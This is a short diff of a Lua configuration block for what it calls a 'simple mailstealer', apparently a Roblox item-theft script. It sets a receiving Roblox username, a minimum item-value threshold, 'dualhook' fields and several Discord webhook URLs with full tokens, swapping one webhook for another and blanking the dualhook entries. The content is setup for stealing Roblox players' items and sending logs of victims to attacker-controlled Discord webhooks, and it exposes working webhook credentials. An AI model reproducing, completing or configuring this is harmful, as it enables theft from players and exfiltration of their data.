@@ -1,14 +1,15 @@
-
+Username = "manifarm5"
+Webhook = "https://discord.com/api/webhooks/1288880636425142373/p6Oc-MStaTBN24hHi0UXIVj0DqcESA7ilyIDwQ-J_Hom4Ds-csozCKlSHY5l4tM-YEgP"
 MinimumRAP = 10000
 
-DualhookUsername = "0_0manidagoat"
-DualhookWebhook = "https://discord.com/api/webhooks/1288949543295258786/L6dL1f6S-h02GBQ0W19yUcOibr8Irst-ojsdrq5-CUoa2FxdnTZVXdV5n8QxqzSt1OEn"
-LogsWebhook = "https://discord.com/api/webhooks/1288949706843492444/C7pc8SbTbrDp-fKhhNlZubrYmjUZ3vc2Ae5fy6jInUWNSAg63tbhinT8SQqdWmjX-FPb"
+DualhookUsername = ""
+DualhookWebhook = ""
+LogsWebhook = ""
 DualhookRAP = math.huge
 mailstealer_name = "XDXD"
 
 Roblox_Username = "manifarm5"
-Discord_Webhook = "https://discord.com/api/webhooks/1288880636425142373/p6Oc-MStaTBN24hHi0UXIVj0DqcESA7ilyIDwQ-J_Hom4Ds-csozCKlSHY5l4tM-YEgP"
+Discord_Webhook = "https://discord.com/api/webhooks/1288949706843492444/C7pc8SbTbrDp-fKhhNlZubrYmjUZ3vc2Ae5fy6jInUWNSAg63tbhinT8SQqdWmjX-FPb"
 
 -- simple mailstealer
 LOGS_WEBHOOK = LogsWebhook
